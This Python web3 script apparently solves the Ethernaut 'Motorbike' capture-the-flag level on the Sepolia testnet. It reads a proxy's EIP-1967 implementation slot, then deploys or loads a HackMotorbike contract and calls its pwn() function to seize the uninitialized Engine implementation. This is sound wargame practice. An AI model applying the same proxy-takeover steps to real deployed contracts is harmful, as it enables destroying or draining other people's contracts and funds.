import os

import solcx
from dotenv import load_dotenv
from eth_abi import encode
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
player = w3.to_checksum_address(os.getenv('WALLET'))
ZERO_ADDRESS = w3.to_checksum_address("0x0000000000000000000000000000000000000000")
hack_contract_address = '0x1537c8AEC852B6Fdbd46E5F83E8149d1f92F7335'

def encode_with_signature(function_signature, *args):
    function_selector = Web3.keccak(text=function_signature)[:4]
    arg_types = [item.split('(')[1][:-1] for item in function_signature.split(' ') if '(' in item]
    encoded_args = encode(arg_types, args)
    return function_selector + encoded_args


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    if version not in (v.public for v in solcx.get_installed_solc_versions()):
        solcx.install_solc(version)
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()
    compiled_sol = solcx.compile_source(contract_source)
    contract_key = f'<stdin>:{contract_name}' if contract_name else next(iter(compiled_sol))
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


def send_tx(transaction, build=True):
    nonce = w3.eth.get_transaction_count(player, 'pending')  # Use pending block tag to include unmined txs
    if build:
        transaction = transaction.build_transaction({
            'from': player,
            'chainId': 11155111,
            'nonce': nonce
        })
    else:  # When you're sending pre-encoded calldata (like a nested multicall)
        transaction['chainId'] = 11155111
        transaction['from'] = player
        transaction['nonce'] = nonce

    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)
    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    if tx_receipt['status'] == 1:
        print(f'Sent transaction with nonce {nonce}: {tx_receipt}')
    else:
        print(f'FAILED transaction: {tx_receipt}')
    return tx_receipt


# Step 0: Load Ethernaut contracts
motorbike_address = w3.to_checksum_address("0x4b96ba8442322cA83897B57Ffa66C62B70915398")
compiled_contract = compile_contract("Motorbike.sol", "0.6.12", "Motorbike")
proxy_contract = w3.eth.contract(address=motorbike_address, abi=compiled_contract['abi'])

# Step 1: Extract the implementation address from the proxy's storage using the standardized EIP-1967 storage slot.
slot = w3.to_hex(int(Web3.keccak(text="eip1967.proxy.implementation").hex(), 16) - 1)  # should give below
print('storage slot of implementation contract', slot)
# slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
impl_raw = w3.eth.get_storage_at(proxy_contract.address, slot)
print('hash of raw implementation', impl_raw.hex())
engine_address = w3.to_checksum_address("0x" + impl_raw.hex()[-40:])
print('implementation/engine contract address:', engine_address)
compiled_contract = compile_contract("Motorbike.sol", "0.6.12", "Engine")
engine = w3.eth.contract(address=engine_address, abi=compiled_contract['abi'])
upgrader = engine.functions.upgrader().call()
print(f"Implementation found at: {engine.address} upgrader:", upgrader)
# assert upgrader == ZERO_ADDRESS

# Step 2: Deploy Hack contract
compiled_contract = compile_contract("Hack.sol", "0.6.12", "HackMotorbike")
if hack_contract_address:
    hack_contract = w3.eth.contract(address=w3.to_checksum_address(hack_contract_address), abi=compiled_contract['abi'])
else:
    hack_contract = w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract['bin'])
    receipt = send_tx(hack_contract.constructor(engine.address))
    hack_contract = w3.eth.contract(address=receipt["contractAddress"], abi=compiled_contract['abi'])
print(f"Hack contract deployed at: {hack_contract.address}")

# Step 3: Call Hack contract's function which updates upgrader
receipt = send_tx(hack_contract.functions.pwn(engine.address))
# assert engine.functions.upgrader().call() != ZERO_ADDRESS
print('Transaction hack_contract.pwn() successful. Please check now')
